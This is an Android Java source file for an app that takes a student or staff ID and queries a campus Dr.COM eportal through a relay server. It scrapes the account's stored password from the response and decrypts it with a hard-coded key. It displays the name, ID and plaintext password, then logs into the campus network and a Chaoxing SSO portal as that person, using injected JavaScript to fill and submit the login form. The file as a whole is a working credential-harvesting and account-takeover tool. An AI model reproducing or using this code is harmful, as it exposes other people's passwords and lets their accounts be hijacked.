package com.example.aasdawwd;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.graphics.Color;
import android.net.Uri;
import android.nfc.Tag;
import android.os.Build;
import android.os.Bundle;
import android.util.AndroidException;
import android.util.Log;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.CookieSyncManager;
import android.webkit.ValueCallback;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.EditText;
import android.widget.FrameLayout;
import android.widget.TextView;

import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

public class MainActivity extends AppCompatActivity {
    private EditText et;
    private String really_urltwo;
    private String yuanma;
    String text;
    private String mimama;
    private WebView webView;
    private String xuehao;
    private String Url_xuexitong;
    String jiemi(String mima) {
        int[] passwd = { 28, 57, 86, 19, 47, 76, 9, 38, 66, 95, 28, 57, 86, 18, 47, 76 };
        String ming = "";
        for (int i = 0; i < mima.length()-1; i++) {
            int a = mima.charAt(i) - passwd[i];
            if (a < 32) {
                a += 95;
            }
            ming += (char) a;
        }
        return ming;
    }



    public static String decodeUnicode(final String dataStr) {
        int start = 0;
        int end = 0;
        final StringBuffer buffer = new StringBuffer();
        while (start > -1) {
            end = dataStr.indexOf("\\u", start + 2);
            String charStr = "";
            if (end == -1) {
                charStr = dataStr.substring(start + 2, dataStr.length());
            } else {
                charStr = dataStr.substring(start + 2, end);
            }
            char letter = (char) Integer.parseInt(charStr, 16); // 16进制parse整形字符串。
            buffer.append(new Character(letter).toString());
            start = end;
        }
        return buffer.toString();
    }










    String getSubString(String text, String left, String right) {
        String result = "";
        int zLen;
        if (left == null || left.isEmpty()) {
            zLen = 0;
        } else {
            zLen = text.indexOf(left);
            if (zLen > -1) {
                zLen += left.length();
            } else {
                zLen = 0;
            }
        }
        int yLen = text.indexOf(right, zLen);
        if (yLen < 0 || right == null || right.isEmpty()) {
            yLen = text.length();
        }
        result = text.substring(zLen, yLen);
        return result;
    }


    String GetHtml(String url1){
        String str="";
        try
        {

            URL url = new URL(url1);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoInput(true);
            conn.setConnectTimeout(6000);
            conn.setRequestMethod("GET");
            conn.setRequestProperty("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8");
            conn.setRequestProperty("Connection","keep-alive");
            conn.setRequestProperty("Accept-Language","zh-CN,zh;q=0.9");
            conn.setRequestProperty("User-Agent","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36");

            String location = conn.getRequestProperty("location");
            int resCode = conn.getResponseCode();
            conn.connect();

            InputStream inputStream=conn.getInputStream();
            byte[] data=new byte[8192];
            int length=inputStream.read(data);
            str=new String(data,0,length);
            conn.disconnect();
            inputStream.close();
        }
        catch(Exception ee)
        {
            System.out.print("ee:"+ee.getMessage());
        }

        return str;
    }


    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        webView = findViewById(R.id.wbb);
        webView.setWebViewClient(new WebViewClient());
        webView.getSettings().setJavaScriptEnabled(true);
        webView.loadUrl("http://8.131.54.75");
        TextView text1=findViewById(R.id.textView);
        TextView text2=findViewById(R.id.textView2);
        TextView text3=findViewById(R.id.textView3);
        TextView text4=findViewById(R.id.textView4);
        Button btn = findViewById(R.id.btn);
        et = findViewById(R.id.editTextTextPersonName);
        Button btn2 = findViewById(R.id.button2);


        btn2.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                String text = et.getText().toString();
                final String[] really_url11 = new String[1];
                String url_denglu = "http://192.168.9.18/drcom/login?callback=dr1004&DDDDD="+text+"&upass="+mimama+"&0MKKey=123456&R1=0&R3=0&R6=0&para=00&v6ip=&v=5366";
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        really_url11[0] = GetHtml(url_denglu);
                        text1.setText(getSubString(really_url11[0], "\"uid\":\"", "\",\"")+"已登陆");
                        text2.setText("IP:"+getSubString(really_url11[0], "ip\"", "ip\""));

                       String uri = "http://192.168.9.18";



//                        try {
//                            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(uri));
//                            //指定谷歌浏览器
//                            startActivity(intent);
//                        }catch (Exception e){
//                            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(uri));
//                            startActivity(intent);
//                        }


                    }
                }).start();

                setContentView(R.layout.denglu);
                WebView kkk = findViewById(R.id.wpp);
                kkk.setWebViewClient(new WebViewClient());
                kkk.getSettings().setJavaScriptEnabled(true);
                kkk.loadUrl("http://192.168.9.18");
                Button XUE = findViewById(R.id.button11);
                XUE.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View view) {
                        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("http://192.168.9.18"));
                        startActivity(intent);

                    }
                });

                Button Backk = findViewById(R.id.Back11);
                Backk.setBackgroundColor(Color.parseColor("#3FE2C5"));
                Backk.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View view) {
                        Intent intent=new Intent(MainActivity.this,MainActivity.class);
                        startActivity(intent);
                    }
                });


            }
        });

        Button btn7;
        btn7 = findViewById(R.id.button7);
        btn7.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View view) {


                setContentView(R.layout.denglu);
                WebView kkk = findViewById(R.id.wpp);
                kkk.clearCache(true);
                kkk.getSettings().setJavaScriptEnabled(true);
                kkk.setWebViewClient(new WebViewClient() {
                    public void onPageFinished(WebView view, String url) {
                        super.onPageFinished(view, url);

                        view.loadUrl("javascript: {" +

                                "document.getElementById('un').value = '"+xuehao+"';" +

                                "document.getElementById('pd').value = '"+mimama+"';" +

                                "var frms = document.getElementsByClassName('login_box_landing_btn');" +

                                "frms[0].click(); };");
                        Url_xuexitong = url;
                    }


                });
                //https://pass.cppu.net/tpass/login?service=https%3A%2F%2Fzgrmjcdx.chaoxing.com%2Fydd%2Flogin
                kkk.loadUrl("http://lfwjxy.fysso.chaoxing.com/sso/lfwjxy");
                //kkk.loadUrl("https://pass.cppu.net/tpass/login?service=https%3A%2F%2Fzgrmjcdx.chaoxing.com%2Fydd%2Flogin");

                Button XUE = findViewById(R.id.button11);
                XUE.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View view) {
                        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(Url_xuexitong));
                        startActivity(intent);

                    }
                });

                Button Backk = findViewById(R.id.Back11);
                Backk.setBackgroundColor(Color.parseColor("#3FE2C5"));
                Backk.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View view) {
                        Intent intent=new Intent(MainActivity.this,MainActivity.class);
                        startActivity(intent);
                        CookieManager.getInstance().removeAllCookies(null);

                        CookieManager.getInstance().flush();
                    }
                });
            }
        });


        Button ceshi_1234 =findViewById(R.id.button1234);
        ceshi_1234.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                String text = et.getText().toString();
                final String IP_URL_123="http://8.131.54.75:7999/submit?age="+text;
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        String test123 = GetHtml(IP_URL_123);

                        String xingming_123 = getSubString(test123, "xc\":\"", "\"");
                        text1.setText(decodeUnicode(xingming_123));


                    }
                }).start();
            }
        });



        Button ceshi_123 =findViewById(R.id.button123);
        ceshi_123.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                String text = et.getText().toString();
                final String IP_URL_123="http://8.131.54.75:7999/submit?name="+text;
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        String test123 = GetHtml(IP_URL_123);
                        String xingming_123 = getSubString(test123, "name\":\"", "\"");
                        text1.setText(xingming_123);
                        String username_123 = getSubString(test123, "username\":\"", "\"");

                        text2.setText(decodeUnicode(username_123));
                    }
                }).start();

            }
        });






        btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                String text = et.getText().toString();
                ////外网版
                final String IP_URL="http://8.131.54.75:801/eportal/?c=Portal&a=self&callback=dr1003&self_type=1&user_account="+text+"&user_password=www&wlan_user_mac=50642baa65d7&wlan_user_ip=10.252.27.108&jsVersion=3.3.3&v=741";
                //内网版
                //final String IP_URL="http://192.168.9.18:801/eportal/?c=Portal&a=self&callback=dr1003&self_type=1&user_account="+text+"&user_password=www&wlan_user_mac=50642baa65d7&wlan_user_ip=10.252.27.108&jsVersion=3.3.3&v=741";
                new Thread(new Runnable(){
                    public void run(){
                        String really_url = GetHtml(IP_URL);
                        //外网版
                        really_urltwo = getSubString(really_url,"url\":\"","\"").replace("\\","").replace("172.28.100.99:80","wzhlovewjq1314.cn:802");
                        //内网版
                        //really_urltwo = getSubString(really_url,"url\":\"","\"").replace("\\","");
                        String mimaqian;
// 最早期想法
//                        while (yuanma.length() < 4000){
//                            yuanma = GetHtml(really_urltwo);
//                        }

//GetHtml改WebView
                        for (int i = 0; i < 5; i++) {
                            yuanma = GetHtml(really_urltwo);
                            if (yuanma.indexOf("userPassword",3)!=-1){
                                break;
                            }
                        }






                            String xingming = getSubString(yuanma, "userRealName\":\"", "\"");

                            mimaqian = getSubString(yuanma, "userPassword\":\"", "\"");
                            text1.setText("姓名：" + xingming);
                            xuehao = getSubString(yuanma, "userName\":\"", "\"");
                            text2.setText(String.format("学号：%s",
                                    xuehao));

                            try{
                                mimama = jiemi(mimaqian.replace("\\\\","\\"));
                                text3.setText(String.format("密码：%s", mimama));
                            } catch (Exception e) {
                                e.printStackTrace();
                                if (really_url == null || really_url.indexOf("a") == -1 || really_url.isEmpty()){
                                    text1.setText("请联系小魏开启服务");
                                    text2.setText("请联系小魏开启服务");
                                    text3.setText("请联系小魏开启服务");


                                }
                                if (really_url != null || really_url.indexOf(".") != -1) {
                                    text1.setText("请检查学号/工号是否正确并再试一遍");
                                    text2.setText("请检查学号/工号是否正确并再试一遍");
                                    text3.setText("请检查学号/工号是否正确并再试一遍");
                                    text4.setText("请检查学号/工号是否正确并再试一遍");
                                }

                            }

//                        if (mimaqian.indexOf('a',3)!=-1){
//                            text3.setText(String.format("密码：%s", jiemi(mimaqian)));
//                        }
//                        else{
//                            text1.setText("请多试几次或联系小魏开启服务器");
//                            text2.setText("请多试几次或联系小魏开启服务器");
//                            text3.setText("请多试几次或联系小魏开启服务器");
//                            text4.setText("请多试几次或联系小魏开启服务器");
//                        }
                        text4.setText(String.format("链接：%s", really_urltwo));
                        if (really_url==null || really_url.isEmpty() || really_url== ""){
                            text1.setText("请联系小魏开启服务器");
                            text2.setText("请联系小魏开启服务器");
                            text3.setText("请联系小魏开启服务器");
                        }
                    }
                }).start();





            }
        });
    }
}